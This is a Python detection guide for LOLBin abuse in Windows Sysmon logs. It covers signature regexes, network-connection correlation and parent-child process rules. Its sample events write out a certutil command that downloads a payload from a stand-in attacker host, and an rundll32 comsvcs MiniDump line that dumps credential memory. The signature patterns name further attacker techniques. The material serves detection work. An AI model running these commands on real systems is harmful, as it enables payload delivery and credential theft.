# LOLBin Detection - Log Correlation Code

Python detection code for the log-correlation steps in the main SKILL.md.

## Step 3: Analyze Sysmon Logs for LOLBin Abuse Patterns

Parse and correlate Sysmon events to identify suspicious LOLBin execution:

```python
import json
import re
from datetime import datetime, timedelta
from collections import defaultdict
from pathlib import Path

# Known LOLBins and their suspicious command-line indicators
LOLBIN_SIGNATURES = {
    "certutil.exe": {
        "suspicious_args": [
            r"-urlcache\s+-f\s+http",
            r"-decode\s+",
            r"-encode\s+",
            r"-verifyctl\s+.*http",
        ],
        "mitre": "T1218, T1105",
        "severity": "high"
    },
    "mshta.exe": {
        "suspicious_args": [
            r"https?://",
            r"vbscript:",
            r"javascript:",
            r"about:",
        ],
        "mitre": "T1218.005",
        "severity": "high"
    },
    "rundll32.exe": {
        "suspicious_args": [
            r"javascript:",
            r"shell32\.dll.*ShellExec_RunDLL",
            r"\\\\.*\\.*\.dll",  # UNC path DLL loading
            r"comsvcs\.dll.*MiniDump",  # LSASS dump via comsvcs
        ],
        "mitre": "T1218.011",
        "severity": "critical"
    },
    "regsvr32.exe": {
        "suspicious_args": [
            r"/s\s+/n\s+/u\s+/i:",
            r"scrobj\.dll",
            r"https?://",
        ],
        "mitre": "T1218.010",
        "severity": "critical"
    },
    "bitsadmin.exe": {
        "suspicious_args": [
            r"/transfer\s+.*https?://",
            r"/create\s+.*\/addfile\s+.*https?://",
            r"/SetNotifyCmdLine",
        ],
        "mitre": "T1197",
        "severity": "high"
    },
    "wmic.exe": {
        "suspicious_args": [
            r"process\s+call\s+create",
            r"/node:",
            r"os\s+get\s+/format:.*https?://",
            r"xsl.*https?://",
        ],
        "mitre": "T1047",
        "severity": "high"
    },
    "msbuild.exe": {
        "suspicious_args": [
            r"\.xml\b",
            r"\.csproj\b",
            r"\\temp\\",
            r"\\appdata\\",
        ],
        "mitre": "T1127.001",
        "severity": "high"
    },
    "mavinject.exe": {
        "suspicious_args": [
            r"/INJECTRUNNING\s+\d+",
        ],
        "mitre": "T1218.013",
        "severity": "critical"
    },
}

def analyze_sysmon_events(events):
    """Analyze Sysmon process creation events for LOLBin abuse."""
    alerts = []

    for event in events:
        image = event.get("Image", "").lower()
        cmdline = event.get("CommandLine", "")
        parent = event.get("ParentImage", "")

        # Check if the process is a known LOLBin
        for lolbin, config in LOLBIN_SIGNATURES.items():
            if image.endswith(lolbin.lower()):
                for pattern in config["suspicious_args"]:
                    if re.search(pattern, cmdline, re.IGNORECASE):
                        alert = {
                            "timestamp": event.get("UtcTime", ""),
                            "hostname": event.get("Computer", ""),
                            "lolbin": lolbin,
                            "command_line": cmdline,
                            "parent_process": parent,
                            "user": event.get("User", ""),
                            "process_id": event.get("ProcessId", ""),
                            "parent_pid": event.get("ParentProcessId", ""),
                            "mitre_technique": config["mitre"],
                            "severity": config["severity"],
                            "matched_pattern": pattern,
                        }
                        alerts.append(alert)
                        break
    return alerts

# Example usage with parsed Sysmon events
sample_events = [
    {
        "UtcTime": "2026-01-20 14:32:15.000",
        "Computer": "WORKSTATION-01",
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -f http://evil.example.com/payload.exe C:\\temp\\update.exe",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "User": "CORP\\jsmith",
        "ProcessId": "4532",
        "ParentProcessId": "2108",
    },
    {
        "UtcTime": "2026-01-20 14:33:01.000",
        "Computer": "WORKSTATION-01",
        "Image": "C:\\Windows\\System32\\rundll32.exe",
        "CommandLine": "rundll32.exe comsvcs.dll, MiniDump 624 C:\\temp\\dump.bin full",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "User": "CORP\\jsmith",
        "ProcessId": "5128",
        "ParentProcessId": "2108",
    },
]

alerts = analyze_sysmon_events(sample_events)
for alert in alerts:
    print(f"[{alert['severity'].upper()}] {alert['lolbin']} on {alert['hostname']}")
    print(f"  MITRE: {alert['mitre_technique']}")
    print(f"  Command: {alert['command_line'][:120]}")
    print(f"  Parent: {alert['parent_process']}")
    print(f"  User: {alert['user']}")
    print()
```

## Step 4: Detect LOLBin Network Connections

LOLBins making outbound network connections is a strong indicator of malicious use:

```python
def detect_lolbin_network_activity(network_events, process_events):
    """Correlate Sysmon network events (ID 3) with process creation (ID 1)
    to find LOLBins making outbound connections."""

    # LOLBins that should rarely make outbound connections
    NETWORK_SUSPICIOUS = {
        "certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
        "msbuild.exe", "installutil.exe", "bitsadmin.exe", "esentutl.exe",
        "expand.exe", "replace.exe", "cmstp.exe", "presentationhost.exe",
    }

    alerts = []
    for event in network_events:
        image = event.get("Image", "").lower()
        binary_name = image.split("\\")[-1] if "\\" in image else image

        if binary_name in NETWORK_SUSPICIOUS:
            dest_ip = event.get("DestinationIp", "")
            dest_port = event.get("DestinationPort", "")

            # Skip localhost and internal DNS
            if dest_ip.startswith("127.") or dest_ip == "::1":
                continue

            alert = {
                "type": "lolbin_network_connection",
                "binary": binary_name,
                "destination_ip": dest_ip,
                "destination_port": dest_port,
                "destination_hostname": event.get("DestinationHostname", ""),
                "source_ip": event.get("SourceIp", ""),
                "user": event.get("User", ""),
                "timestamp": event.get("UtcTime", ""),
                "severity": "critical",
            }
            alerts.append(alert)
            print(f"[CRITICAL] {binary_name} connected to "
                  f"{dest_ip}:{dest_port} ({event.get('DestinationHostname', 'N/A')})")

    return alerts
```

## Step 5: Monitor Anomalous Parent-Child Process Relationships

```python
# Suspicious parent-child relationships indicating LOLBin abuse
SUSPICIOUS_PARENT_CHILD = [
    # Office apps spawning LOLBins (macro execution)
    {"parent": ["winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe"],
     "child": ["cmd.exe", "powershell.exe", "pwsh.exe", "mshta.exe",
               "wscript.exe", "cscript.exe", "certutil.exe"],
     "severity": "critical", "mitre": "T1204.002"},

    # Explorer spawning script interpreters directly
    {"parent": ["explorer.exe"],
     "child": ["mshta.exe", "regsvr32.exe", "msbuild.exe"],
     "severity": "high", "mitre": "T1218"},

    # WMI provider spawning processes (lateral movement)
    {"parent": ["wmiprvse.exe"],
     "child": ["cmd.exe", "powershell.exe", "mshta.exe"],
     "severity": "critical", "mitre": "T1047"},

    # Services spawning unusual children
    {"parent": ["services.exe"],
     "child": ["cmd.exe", "powershell.exe", "mshta.exe", "rundll32.exe"],
     "severity": "high", "mitre": "T1543.003"},
]

def check_parent_child_anomaly(event):
    """Check if a process creation event has a suspicious parent-child pair."""
    parent = event.get("ParentImage", "").split("\\")[-1].lower()
    child = event.get("Image", "").split("\\")[-1].lower()

    for rule in SUSPICIOUS_PARENT_CHILD:
        if parent in rule["parent"] and child in rule["child"]:
            return {
                "alert_type": "suspicious_parent_child",
                "parent": parent,
                "child": child,
                "command_line": event.get("CommandLine", ""),
                "mitre": rule["mitre"],
                "severity": rule["severity"],
                "hostname": event.get("Computer", ""),
                "user": event.get("User", ""),
                "timestamp": event.get("UtcTime", ""),
            }
    return None
```
